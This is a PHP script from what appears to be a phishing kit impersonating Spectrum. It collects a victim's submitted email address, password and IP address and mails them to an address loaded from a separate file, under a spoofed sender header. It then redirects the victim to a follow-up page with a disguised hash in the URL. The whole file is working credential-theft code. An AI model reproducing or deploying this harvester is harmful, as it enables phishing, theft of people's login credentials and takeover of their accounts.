<?php

ini_set("output_buffering",4096);
session_start();
ob_start();

$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$host=md5("$base");

include 'Email.php';

$ip = getenv("REMOTE_ADDR");
$message .= "PSYCHO--------------[ Email ]---------------------\n";
$message .= "Email address : ".$_POST['email']."\n";
$message .= "Email PasWord : ".$_POST['pass']."\n";
$message .= "PSYCHO--------------[ POMOASTIC ]---------------------\n";
$message .= "IP            : ".$ip."\n";
$message .= "--------------[ UnKnown ]---------------------\n";
$subject = "$ip | Spectrum";
$headers = "From: Spectrum <yesli1@cenglandb.com>";
mail($SEND,$subject,$message,$headers);

session_destroy();
$header = "details.php?$host-$host-$host";
header("Location: $header");

?>